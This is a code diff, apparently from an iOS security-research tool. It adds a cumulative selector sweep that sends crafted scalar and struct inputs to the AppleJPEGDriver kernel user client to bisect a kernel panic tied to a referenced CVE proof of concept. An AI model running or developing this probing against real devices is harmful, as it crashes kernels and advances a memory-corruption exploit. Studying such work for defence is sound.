@@ -1024,6 +1024,125 @@ NSString *ModJpegSel31(void) {
     return @"sel31 probe done: phase A (sel26..31, three shapes) + phase B (six 0xDA0 variants)";
 }
 
+// Cumulative sweep-range probe.  The focused sel31 probe produced NO panic, so
+// sel31 alone is not the cause - the panic needs state created by earlier calls
+// in the full sweep.  These modules run a PREFIX of the sweep (sel lo..hi, four
+// call shapes, marker written before every call) so the bisect is: run 0-7, then
+// 0-15, then 0-23; the first prefix that panics names the selector that creates
+// the object whose obj+0x54 (loop count) and obj+0x78 (bound, a copy of
+// obj+0x36c) disagree.
+static NSString *ModJpegSweepRange(int lo, int hi) {
+    AveLog(S(@"[sweep] === cumulative sweep sel%d..%d (four shapes) ===", lo, hi));
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }
+
+    mach_port_t notify = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
+        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
+    IOConnectSetNotificationPort(conn, 0, notify, 0);
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    [[UIColor blueColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W / 2, H / 2));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!jpeg || !src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOServiceClose(conn); IOObjectRelease(svc);
+        return @"surface/jpeg setup failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+    AveLog(S(@"[sweep] sel%d..%d src=%u dst=%u jpeg=%zuB", lo, hi, srcID, dstID, jpeg.length));
+
+    int calls = 0;
+    for (int sel = lo; sel <= hi; sel++) {
+        uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
+        uint64_t oc64[8];
+        uint32_t oc = 8;
+        memset(oc64, 0, sizeof oc64);
+        rs_jm_markSel(sel, 0);
+        kern_return_t kA = IOConnectCallMethod(conn, sel, sc, 6, NULL, 0, oc64, &oc, NULL, NULL);
+        AveLog(S(@"sel%-2d scalar  kr=%#x outCnt=%u", sel, kA, oc));
+        calls++;
+
+        RSJpegIn b1;
+        RSJpegIn b2;
+        memset(&b1, 0, sizeof b1);
+        memset(&b2, 0, sizeof b2);
+        rs_jm_fill(&b1, srcID, dstID, W, H, 0, 0x6161);
+        size_t osz = sizeof b2;
+        rs_jm_markSel(sel, 1);
+        kern_return_t kB = IOConnectCallStructMethod(conn, sel, &b1, sizeof b1, &b2, &osz);
+        AveLog(S(@"sel%-2d 0x58    kr=%#x outSize=%zu", sel, kB, osz));
+        calls++;
+
+        uint8_t *c1 = (uint8_t *)malloc(0x1000);
+        uint8_t *c2 = (uint8_t *)malloc(0x1000);
+        if (c1 && c2) {
+            memset(c1, 0, 0x1000);
+            memset(c2, 0, 0x1000);
+            rs_jm_fill((RSJpegIn *)c1, srcID, dstID, W, H, 0, 0x6161);
+            osz = 0x1000;
+            rs_jm_markSel(sel, 2);
+            kern_return_t kC = IOConnectCallStructMethod(conn, sel, c1, 0x1000, c2, &osz);
+            AveLog(S(@"sel%-2d 0x1000  kr=%#x outSize=%zu", sel, kC, osz));
+            if (kC == KERN_SUCCESS && osz > 0)
+                rs_jm_dump(S(@"sel%u 0x1000 out", sel), c2, osz);
+            calls++;
+        }
+        free(c1);
+        free(c2);
+
+        uint8_t *d1 = (uint8_t *)malloc(0xDA0);
+        uint8_t *d2 = (uint8_t *)malloc(0xDA0);
+        if (d1 && d2) {
+            memset(d1, 0, 0xDA0);
+            memset(d2, 0, 0xDA0);
+            rs_jm_fill((RSJpegIn *)d1, srcID, dstID, W, H, 0, 0x6161);
+            osz = 0xDA0;
+            rs_jm_markSel(sel, 3);
+            kern_return_t kD = IOConnectCallStructMethod(conn, sel, d1, 0xDA0, d2, &osz);
+            AveLog(S(@"sel%-2d 0xDA0   kr=%#x outSize=%zu", sel, kD, osz));
+            if (kD == KERN_SUCCESS && osz > 0)
+                rs_jm_dump(S(@"sel%u 0xDA0 out", sel), d2, osz);
+            calls++;
+        }
+        free(d1);
+        free(d2);
+
+        rs_jm_drain(notify, S(@"sel%d", sel));
+    }
+
+    IOServiceClose(conn);
+    CFRelease(src); CFRelease(dst);
+    IOObjectRelease(svc);
+    AveSetStatus(@"sweep range done - no panic");
+    return S(@"sweep sel%d..%d done: %d calls, NO PANIC", lo, hi, calls);
+}
+
+NSString *ModJpegSweep07(void)  { return ModJpegSweepRange(0, 7); }
+NSString *ModJpegSweep015(void) { return ModJpegSweepRange(0, 15); }
+NSString *ModJpegSweep023(void) { return ModJpegSweepRange(0, 23); }
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
